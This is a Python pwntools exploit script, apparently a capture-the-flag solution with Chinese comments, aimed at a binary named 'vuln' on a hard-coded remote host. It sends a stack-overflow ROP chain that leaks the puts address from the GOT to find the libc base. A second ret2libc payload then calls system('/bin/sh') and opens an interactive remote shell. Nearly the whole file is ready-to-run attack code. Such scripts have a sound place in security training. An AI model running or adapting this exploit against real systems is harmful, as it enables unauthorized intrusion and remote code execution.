from pwn import *

context.binary = ELF("./vuln", checksec=False)
context.arch = "amd64"
context.log_level = "info"

HOST = "120.27.146.76"
PORT = 25835

libc = ELF("./libc-2.31.so", checksec=False)

# ============================================
# Gadgets (No PIE, No Canary, NX)
# ============================================
OFFSET      = 72                        # 64 (buf) + 8 (saved rbp)
POP_RDI_RET = 0x4012B3                  # pop rdi; ret
RET         = 0x40101A                  # ret (stack alignment)
MAIN        = 0x4011F6                  # main()


def exploit():
    p = remote(HOST, PORT)

    # ========================================
    # Stage 1: 泄露 puts@GOT → 计算 libc 基址 → 返回 main
    # ========================================
    p.recvuntil(b"Leave your note:\n")

    payload1 = flat(
        b"A" * OFFSET,
        POP_RDI_RET,
        context.binary.got.puts,         # puts@GOT → 泄露 libc 中的 puts 地址
        context.binary.plt.puts,         # puts(puts@GOT)
        MAIN,                            # 返回 main，再进一次 vuln
    )
    p.send(payload1)

    p.recvuntil(b"Note saved. Thank you!\n")
    leaked = u64(p.recv(6).ljust(8, b"\x00"))
    libc.address = leaked - libc.sym.puts
    log.success("libc base  → %#x" % libc.address)

    # ========================================
    # Stage 2: ret2libc — system("/bin/sh")
    # ========================================
    p.recvuntil(b"Leave your note:\n")

    binsh = next(libc.search(b"/bin/sh"))

    payload2 = flat(
        b"A" * OFFSET,
        RET,                             # 栈对齐
        POP_RDI_RET,
        binsh,                           # rdi → "/bin/sh"
        libc.sym.system,                 # system("/bin/sh")
    )
    p.send(payload2)


    import time
    time.sleep(0.5)
    p.interactive()

    p.close()


if __name__ == "__main__":
    exploit()
